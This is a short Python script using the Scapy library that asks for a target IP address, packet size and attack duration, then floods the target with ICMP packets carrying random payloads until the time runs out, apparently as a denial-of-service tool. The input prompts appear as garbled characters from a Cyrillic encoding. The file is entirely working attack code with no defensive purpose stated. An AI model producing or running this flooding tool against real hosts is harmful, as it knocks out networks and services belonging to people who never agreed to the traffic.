# -*- coding: cp1251 -*-
import random
import sys
from scapy.all import *

target_ip = str(input('IP-����� ���������� �����: '))
packet_size = int(input('������ ������ (����): '))
attack_duration = int(input('����������������� ����� (�): '))

def send_icmp_packet(target_ip, packet_size):
    packet = IP(dst=target_ip)/ICMP()/Raw(load=''.join(chr(random.randint(0, 255)) for _ in range(packet_size)))
    send(packet, verbose=False)

end_time = time.time() + attack_duration
while time.time() < end_time:
    send_icmp_packet(target_ip, packet_size)

print('Attack finished')